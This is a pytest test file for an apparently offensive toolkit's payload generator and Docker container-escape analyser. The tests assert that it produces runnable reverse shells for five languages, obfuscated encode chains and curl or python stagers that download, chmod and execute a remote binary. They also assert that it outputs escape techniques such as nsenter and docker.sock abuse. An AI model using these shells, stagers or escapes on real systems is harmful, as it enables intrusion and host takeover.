"""New attack surfaces (v5.2 wave 3): payloadforge, containerbreak.

Every tool must produce real, runnable output — no simulation."""

import base64
import gzip
import importlib.util
from unittest import mock


def load_pack(name):
    spec = importlib.util.spec_from_file_location(f"surf.{name}", f"suijin/modules/{name}/main.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class TestPayloadforge:
    def setup_method(self):
        self.mod = load_pack("payloadforge")

    def test_bash_shell(self):
        out = self.mod.rev_shell("10.10.14.1", "4444", "bash")
        assert "/dev/tcp/10.10.14.1/4444" in out
        assert out.startswith("bash")

    def test_all_5_contexts(self):
        for ctx in ("bash", "python", "nc", "php", "powershell"):
            out = self.mod.rev_shell("10.0.0.1", "4444", ctx)
            assert "10.0.0.1" in out and "Error" not in out and "{lhost" not in out

    def test_python_shell_valid_syntax(self):
        """The generated python command is syntactically runnable."""
        out = self.mod.rev_shell("10.0.0.1", "4444", "python")
        # strip the python3 -c 'wrapper' and compile the inner code
        inner = out.split("-c '", 1)[1].rstrip("'")
        compile(inner, "<payload>", "exec")

    def test_encode_chain_roundtrip(self):
        import re

        enc = self.mod.encode_chain("echo roundtrip", "2")
        m = re.search(r"\n([A-Za-z0-9+/=]{20,})\n", enc)
        blob = m.group(1)
        inner = gzip.decompress(base64.b64decode(blob))
        raw = base64.b64decode(inner)
        assert raw == b"echo roundtrip"

    def test_encode_chain_includes_decode_cmd(self):
        enc = self.mod.encode_chain("echo x", "2")
        assert "decode:" in enc

    def test_stager_curl(self):
        st = self.mod.stager("http://10.0.0.1/payload.elf", "curl", "/tmp/x")
        assert "curl -sL http://10.0.0.1/payload.elf" in st and "chmod +x" in st and "/tmp/x" in st

    def test_stager_python(self):
        st = self.mod.stager("http://10.0.0.1/x", "python", "/tmp/p")
        assert "urlretrieve" in st and "execv" in st

    def test_errors(self):
        assert "Error" in self.mod.rev_shell("")
        assert "Error" in self.mod.encode_chain("")
        assert "Error" in self.mod.stager("")


class _FakeResp:
    def __init__(self, payload, status=200):
        self._p = payload
        self.status_code = status

    def json(self):
        return self._p


class TestContainerbreak:
    def setup_method(self):
        self.mod = load_pack("containerbreak")

    def test_api_unreachable(self):
        with mock.patch.object(self.mod.requests, "get", side_effect=self.mod.requests.ConnectionError("refused")):
            out = self.mod.docker_analyze("http://127.0.0.1:2375")
            assert "unreachable" in out.lower()

    def test_privileged_detected(self):
        version = _FakeResp({"Version": "24.0.7", "ApiVersion": "1.43"})
        containers = _FakeResp([{"Id": "abc123def456", "Names": ["/victim"], "State": "running"}])
        detail = _FakeResp({"HostConfig": {"Privileged": True, "CapAdd": None, "Binds": None, "Devices": None}})
        with mock.patch.object(self.mod.requests, "get", side_effect=[version, containers, detail]):
            out = self.mod.docker_analyze("http://127.0.0.1:2375")
            assert "PRIVILEGED" in out
            assert "nsenter" in out

    def test_dangerous_caps_detected(self):
        version = _FakeResp({"Version": "24.0.7"})
        containers = _FakeResp([{"Id": "abc", "Names": ["/cap-test"]}])
        detail = _FakeResp(
            {"HostConfig": {"Privileged": False, "CapAdd": ["SYS_ADMIN", "NET_ADMIN"], "Binds": None, "Devices": None}}
        )
        with mock.patch.object(self.mod.requests, "get", side_effect=[version, containers, detail]):
            out = self.mod.docker_analyze("http://127.0.0.1:2375")
            assert "SYS_ADMIN" in out and "mount -t proc" in out

    def test_socket_mount_detected(self):
        version = _FakeResp({"Version": "24.0.7"})
        containers = _FakeResp([{"Id": "abc", "Names": ["/sock-test"]}])
        detail = _FakeResp(
            {
                "HostConfig": {
                    "Privileged": False,
                    "CapAdd": None,
                    "Binds": ["/var/run/docker.sock:/var/run/docker.sock"],
                    "Devices": None,
                }
            }
        )
        with mock.patch.object(self.mod.requests, "get", side_effect=[version, containers, detail]):
            out = self.mod.docker_analyze("http://127.0.0.1:2375")
            assert "docker.sock" in out and "unix-socket" in out

    def test_no_vectors_clean(self):
        version = _FakeResp({"Version": "24.0.7"})
        containers = _FakeResp([{"Id": "abc", "Names": ["/safe"]}])
        detail = _FakeResp({"HostConfig": {"Privileged": False, "CapAdd": None, "Binds": None, "Devices": None}})
        with mock.patch.object(self.mod.requests, "get", side_effect=[version, containers, detail]):
            out = self.mod.docker_analyze("http://127.0.0.1:2375")
            assert "No escape vectors" in out
